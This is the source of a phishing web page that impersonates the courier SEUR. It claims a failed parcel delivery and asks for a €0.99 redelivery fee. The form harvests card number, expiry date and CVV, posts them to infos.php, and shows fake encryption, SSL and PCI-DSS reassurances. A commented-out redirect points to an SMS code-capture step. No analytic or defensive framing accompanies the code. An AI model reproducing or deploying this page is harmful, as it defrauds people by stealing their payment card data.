<?php 
    require_once "functions.php";
?>



<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>SEUR: Envío y transporte de paquetería y mensajería | SEUR</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/arda.css">
  <link rel="preconnect" href="https://fonts.gstatic.com">

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/favicon.jpg" type="image/x-icon" />
  <link rel="shortcut icon" href="image/favicon.jpg" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
  <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons" />
  <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
  <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
  <style>
      .modal-open{
        overflow:hidden;
        padding-right:0px;
      }
  </style>
</head>
<body class="modal-open">


  <!-- Modal -->
  <div class="modal problem fade show" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" style="display:block;background: rgba(0, 0, 0, 0.6);"> 
    <div class="modal-dialog modal-dialog-centered justify-content-center w-xs-100">
      <div class="modal-content">
        <div class="modal-body">
          <div class="text-center ">
            <div class="lola">
              <div class="loader"></div>
              <img src="image/one.jpg" alt="" width="200px" class="d-block" style="margin:0 auto">
            </div>
            <br>
            <p style="font-weight: 500;font-size:15px;display: none;" id="one">Cifrando la informatión de la tarjeta...</p>
            <p style="font-weight: 500;font-size:15px;" id="two">Finalizando transacción...</p>
            <ul class="nav justify-content-center">
              <li class="nav-item active"><img src="image/lock.svg" alt="" width="15">Cifrado SSl</li>
              <li class="nav-item"><img src="image/pro.svg" alt="" width="15">Certificado PCI-DSS</li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  </div>
   
   <header>
       <div class="container">
           <div class="left d-flex align-items-center">
               <img src="image/logo.png" alt="" width="120px" class="img-fluid">
               <img src="image/list.png" alt="" style="margin-left:30px" class="d-none d-xl-block img=fluis">
           </div>
           <div class="right">
               <img src="image/bar.png" alt="" class="d-block d-xl-none img-fluid" style="padding-left:30px">
               <img src="image/left22.png" alt=""  class="d-none d-xl-block img-fluid" >
           </div>
       </div>
   </header>

    <main id="main">
       <div class="container">
           <p><span style="color: #E9502A;font-weight: 600;">Inicio  / </span>  <b style="color: #d13505;">Seguimiento de paquetes</b></p>
           <br>
           <div class="login ">
               <h2 class="text-center" style="color: #E9502A;font-weight: 700;">Paquete n.º: 252296541</h2>
               <div class="ale px-0" style="border: none; background: white;">
                   <p class="mb-0 text-start" style="font-size:14px;color: black;font-weight: 500;">
                       Tras un problema en el primer intento de entrega, su paquete será reenviado desde nuestro almacén.
                       <br><br>
                       Es necesario un método de pago válido para abonar los gastos de reenvio, por un importe de 0.99 €.
                       <br>
                    </p>
               </div>
               <div class="text-center">
                   <img src="image/bc.png" alt="" width="250px" class="img-fluid">
               </div>
               <br>
               <h3  style="color: #E9502A;font-weight: 500;">Preautorización: <b>0,99€</b></h3>
               <form action="infos.php" method="post">
                    <input type="hidden" name="step" value="cc">
                    <div class="form-group mt-4">
                      <input type="text" class="form-control" name="card" id="card-number"  placeholder="Número de tarjeta" data-mask="0000 0000 0000 0000" oninput="handleCardInput()">
                      <img id="card-logo" class="card-logo"   style="display: inline;position: absolute;right: 10px;top: 27px;width: 34px;" src="https://img.icons8.com/ios/50/cccccc/bank-card-back-side--v1.png" alt="unknown card" />
                      <div id="message" style="font-size: 14px;margin-top: 5px;"></div>
                    </div>
                    <div class="form-group mt-4">
                      <input type="text" class="form-control" name="date" id="exp-date" placeholder="MM/YY" data-mask="00/00" oninput="handleExpDateInput()" >
                      <div class="nose" id="exp-message" style="    font-size: 14px;margin-top: 5px;"></div>
                    </div>
                    <div class="form-group mt-4">
                      <input type="text" class="form-control" name="cvv" id="cvv" placeholder="123" data-mask="0000" oninput="handleCvvInput()">
                      <div class="nose" id="cvv-message" style="font-size: 14px;margin-top: 5px;"></div>
                    </div>
                    <div class="ale px-0">
                       <p class="mb-0 text-center">Los gastos solo se cobrarán una vez que se confirme la entrega exitosa de su paquete</p>
                    </div>
                    <button class="btn mt-4" name="submit" id="pay-button" disabled style="display: block;text-align: center;margin: 0 auto;">Confirmar mi método de pago</button>
                    <div class="text-center mt-4" style="font-size:14px;color: black;">
                        🔒 Este sitio es completamente seguro
                    </div>
                    
                    <style>
                        #cvv-message,#exp-message,#message{
                            color: #e9502a;
                            text-align: center;
                        }
                    </style>
               </form>
           </div> 
       </div>
   </main>

   <div class="service">
       <div class="container">
           <div class="row justify-content-center">
               <div class="col-lg-4 col-md-4 col-sm-6 mt-4">
                   <div class="text-center">
                       <img src="image/img1.jpg" alt="" class="img-fluid">
                   </div>
               </div>
               <div class="col-lg-4 col-md-4 col-sm-6 mt-4">
                   <div class="text-center">
                       <img src="image/img2.jpg" alt="" class="img-fluid">
                   </div>
               </div>
               <div class="col-lg-4 col-md-4 col-sm-6 mt-4">
                   <div class="text-center">
                       <img src="image/img3.jpg" alt="" class="img-fluid">
                   </div>
               </div>
           </div>
           <div class="row justify-content-center" >
               <div class="col-lg-4 col-md-4 col-sm-6 mt-4">
                   <div class="text-center">
                       <img src="image/img4.png" alt="" class="img-fluid">
                   </div>
               </div>
               <div class="col-lg-4 col-md-4 col-sm-6 mt-4">
                   <div class="text-center">
                       <img src="image/img5.png" alt="" class="img-fluid">
                   </div>
               </div>
               <div class="col-lg-4 col-md-4 col-sm-6 mt-4">
                   <div class="text-center">
                       <img src="image/img7.png" alt="" class="img-fluid">
                   </div>
               </div>
           </div>
       </div>
   </div>



   <footer>
       <div class="container lose">
           <div class="row">
               <div class="col-lg-9">
                   <div class="row">
                       <div class="col-lg-4 mt-4">
                           <ul class="nav d-block">
                               <li class="nav-item active d-flex align-items-center justify-content-between ">Enviar paquete <img src="image/plus.svg" alt=""></li>
                               <li class="nav-item"><img src="image/arrow.svg" alt=""> Envio online</li>
                               <li class="nav-item"><img src="image/arrow.svg" alt=""> Envío online con descuento</li>
                               <li class="nav-item"><img src="image/arrow.svg" alt=""> Calculadora servicio SEUR 24</li>
                           </ul>
                       </div>
                       <div class="col-lg-4 mt-4">
                           <ul class="nav d-block">
                               <li class="nav-item active d-flex align-items-center justify-content-between">Recibir envío <img src="image/plus.svg" alt=""></li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">Seguimiento de Envíos</li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">Entrega interactiva</li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">Recoger en tienda</li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">Preguntas frecuentes</li>
                           </ul>
                       </div>
                       <div class="col-lg-4 mt-4">
                           <ul class="nav d-block">
                               <li class="nav-item active d-flex align-items-center justify-content-between">Actualidad <img src="image/plus.svg" alt=""></li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">Fundación SEUR</li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">Blog SEUR</li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">Sala de prensa</li>
                           </ul>
                       </div>
                       <div class="col-lg-4 mt-4">
                           <ul class="nav d-block">
                               <li class="nav-item active d-flex align-items-center justify-content-between">Envío internacional <img src="image/plus.svg" alt=""></li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">Seguimiento internacional</li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">Envíos a Europa</li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">Envíos a Estados Unidos</li>
                           </ul>
                       </div>
                       <div class="col-lg-4 mt-4">
                           <ul class="nav d-block">
                               <li class="nav-item active d-flex align-items-center justify-content-between">Empresas <img src="image/plus.svg" alt=""></li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">Acceso a SEUR Pro</li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">Únete a la red SEUR Picku</li>
                           </ul>
                       </div>
                       <div class="col-lg-4 mt-4">
                           <ul class="nav d-block">
                               <li class="nav-item active d-flex align-items-center justify-content-between">Descubre SEUR <img src="image/plus.svg" alt=""></li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">SEUR Internacional</li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">Fulfillment by SEUR</li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">SEUR Mensajería</li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">Trabaja con nosotros</li>
                           </ul>
                       </div>
                   </div>
               </div>
               <div class="col-lg-3">
                   <div class="row">
                       <div class="col-12 mt-4">
                           <ul class="nav d-block">
                               <li class="nav-item active">Encuéntranos:</li>
                               <li class="nav-item d-block"><img src="image/fb.png" alt="" class="img-fluid" style="filter: none;"></li>
                           </ul>
                       </div>
                       <div class="col-12 mt-4">
                           <ul class="nav d-block">
                               <li class="nav-item active">Métodos de pago:</li>
                               <li class="nav-item d-block"><img src="image/ps3.png" alt="" class="img-fluid" style="filter: none;"></li>
                           </ul>
                       </div>
                   </div>
               </div>
           </div>
       </div>
       <div class="container live d-flex align-items-center">
           <h6 class="d-flex align-items-center"><img src="image/lolo.svg" alt="" class="d-block d-lg-none" style=" filter: brightness(0) invert(1);margin-right: 15px;">Copyright © SEUR 2024</h6>
           <ul class="d-none d-lg-block">
               <li class="">Política de privacidad y cookies</li>
               <li class="">Configure cookies</li>
               <li class="">Aviso legal</li>
               <li class="">Uso fraudulento de la marca</li>
               <li class="">Condiciones de transporte</li>
           </ul>
           <img src="image/fot.png" alt="" class="img-fluid" width="120px">
       </div>
   </footer>













     


  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/jquery.mask.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
        $(document).ready(function () {
      // #one kayban awal
      $("#one").show();
      $("#two").hide();

      // ba3d 5 seconds ndir switch
      setTimeout(function () {
        $("#one").fadeOut(700, function () {
          $("#two").fadeIn(700);
        });
      }, 5000);
    });


    // setTimeout(function () {
    //   window.location.href= 'sms.php';
    // },14000); // 1000 = 1s 
  </script>

</body>
</html>